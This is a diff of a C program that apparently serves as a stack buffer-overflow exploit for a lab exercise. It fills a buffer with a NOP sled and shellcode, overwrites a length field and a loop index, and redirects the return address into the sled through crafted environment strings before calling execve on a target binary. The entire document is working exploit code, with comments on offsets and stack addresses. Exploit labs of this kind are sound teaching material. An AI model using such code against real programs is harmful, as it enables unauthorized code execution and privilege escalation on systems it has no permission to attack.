@@ -10,35 +10,38 @@ int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[2];
+	char *	env[6];
 
 	// memory address between buff and len
 	char buffer[400];
 	char *nop = "\x90";
-	char *newLen = "\x4c\x01";							 // distance between ret and buff 328+4
+	char *newLen = "\x1d\x01";
 
 	for (int i = 0; i < 213; i++)
 		strcat(buffer, nop);
-	strcat(buffer, shellcode);
-	strcat(buffer, newLen);
+	strcat(buffer, shellcode); //up to buf[263]
+	strcat(buffer, newLen);  // buf[264] = 4c, buf[265] = 01
 
-	char return_addr[] = "\x80\xfd\x21\x30"; // addr of buff
-	char *newI = "\x0c\x01";
+	char return_addr[] = "\x86\xfd\x21\x30"; // addr where NOPs in buffer starts
+	char *newI = "\x0c\x01"; // buf[267-269]
 
-	// memory address between i and return address
+	// memory address between i+4 and return address stored at 0x3021fe98
 	char gap[500];
-	strcat(gap, newI);
-	for (int i = 0; i < 52; i++)  // distance between i and ret
+	for (int i = 0; i < 8; i++)  // distance between i and ret
 		strcat(gap, nop);
-	strcat(gap, return_addr);
+	strcat(gap, return_addr);  // buf[279]
 
 	// arguments and envs
 	args[0] = TARGET;
 	args[1] = buffer;
 	args[2] = NULL;
 
-	env[0] = "";
-	env[1] = gap;
+	env[0] = "\0\0";
+	env[1] = newI;
+	env[2] = "\0\0"; // buf[270-272]
+	env[3] = gap; //buf[272-284]
+	env[4] = "\0";
+	env[5] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
